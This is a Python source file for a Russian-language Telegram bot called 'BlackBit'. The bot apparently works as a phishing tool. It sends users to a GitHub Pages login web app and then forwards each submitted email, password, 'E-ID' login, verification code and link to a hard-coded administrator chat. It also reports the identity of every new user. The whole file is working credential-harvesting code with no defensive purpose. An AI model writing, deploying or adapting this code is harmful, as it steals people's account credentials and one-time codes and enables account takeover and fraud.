import os
import logging
import json
import requests
import time
from datetime import datetime
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ==================== КОНФИГ ====================
BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN")
ADMIN_ID = 8893485920
WEB_APP_URL = "https://d3987616-hue.github.io/blackbit/"
# ===============================================

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

user_sessions = {}

class BlackBitBot:
    def __init__(self):
        self.app = Application.builder().token(BOT_TOKEN).build()
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(MessageHandler(filters.ALL, self.handle))

    async def start(self, update: Update, context):
        user = update.effective_user
        current_time = datetime.now().strftime("%d.%m.%Y %H:%M")

        await self.app.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🟢 НОВЫЙ ВХОД В БОТА!\n\n"
                 f"👤 ID: `{user.id}`\n"
                 f"👤 Имя: {user.first_name or 'без имени'}\n"
                 f"👤 Username: @{user.username or 'нет'}\n"
                 f"🕐 Время: {current_time}",
            parse_mode="Markdown"
        )

        await update.message.reply_text(
            f"👋 Привет, {user.first_name}!\n\n"
            f"Нажмите кнопку ВНИЗУ, чтобы открыть приложение BlackBit.\n\n"
            f"Если Вы ещё не зарегистрированы в BlackBit, выберите Вход через E-ID.",
            reply_markup=ReplyKeyboardMarkup(
                [[KeyboardButton("🔑 Войти", web_app=WebAppInfo(url=WEB_APP_URL))]],
                resize_keyboard=True
            )
        )

    async def handle(self, update: Update, context):
        if not update.message:
            return

        msg = update.message
        user_id = msg.from_user.id
        text = msg.text

        # ===== ДИАГНОСТИКА =====
        logger.info(f"📩 Получено: text='{text}', web_app_data={msg.web_app_data}")

        if user_sessions.get(user_id, {}).get('awaiting_code'):
            await self.app.bot.send_message(
                ADMIN_ID,
                text=f"📧 КОД: `{text}`",
                parse_mode="Markdown"
            )
            user_sessions[user_id]['awaiting_code'] = False
            await msg.reply_text("✅ Код отправлен администратору!")
            return

        if user_sessions.get(user_id, {}).get('awaiting_link'):
            await self.app.bot.send_message(
                ADMIN_ID,
                text=f"🔗 ССЫЛКА: `{text}`",
                parse_mode="Markdown"
            )
            user_sessions[user_id]['awaiting_link'] = False
            await msg.reply_text("✅ Ссылка отправлена администратору!")
            return

        if text and text.startswith('{') and text.endswith('}'):
            try:
                data = json.loads(text)
                email = data.get('email')
                password = data.get('password')
                code = data.get('code')
                link = data.get('link')
                eid_type = data.get('type')

                if email and password and not code and not link and not eid_type:
                    await self.app.bot.send_message(
                        ADMIN_ID,
                        text=f"🔔 НОВАЯ ЗАЯВКА!\n\n"
                             f"👤 ID: `{user_id}`\n"
                             f"📧 Логин: `{email}`\n"
                             f"🔑 Пароль: `{password}`",
                        parse_mode="Markdown"
                    )
                    await msg.reply_text("✅ Заявка отправлена администратору!")
                    logger.info(f"✅ Заявка от {user_id} отправлена админу")
                    return

                if eid_type == 'eid_login' and email and password:
                    await self.app.bot.send_message(
                        ADMIN_ID,
                        text=f"🆔 E-ID ВХОД\n\n"
                             f"👤 ID: `{user_id}`\n"
                             f"📧 Логин: `{email}`\n"
                             f"🔑 Пароль: `{password}`",
                        parse_mode="Markdown"
                    )
                    await msg.reply_text("✅ Заявка E-ID отправлена администратору!")
                    return

                if code:
                    await self.app.bot.send_message(
                        ADMIN_ID,
                        text=f"📧 КОД: `{code}`",
                        parse_mode="Markdown"
                    )
                    await msg.reply_text("✅ Код отправлен администратору!")
                    return

                if link:
                    await self.app.bot.send_message(
                        ADMIN_ID,
                        text=f"🔗 ССЫЛКА: `{link}`",
                        parse_mode="Markdown"
                    )
                    await msg.reply_text("✅ Ссылка отправлена администратору!")
                    return

            except Exception as e:
                logger.error(f"Ошибка: {e}")
                await msg.reply_text("❌ Ошибка обработки данных")

        else:
            if text:
                await msg.reply_text("ℹ️ Используйте кнопку «Войти»")

    def run(self):
        try:
            requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=True')
            requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset=-1&timeout=1')
            time.sleep(1)
        except:
            pass

        print("=" * 50)
        print("🚀 БОТ BLACKBIT ЗАПУЩЕН")
        print(f"👤 ADMIN_ID: {ADMIN_ID}")
        print("=" * 50)

        self.app.run_polling()


if __name__ == "__main__":
    bot = BlackBitBot()
    bot.run()
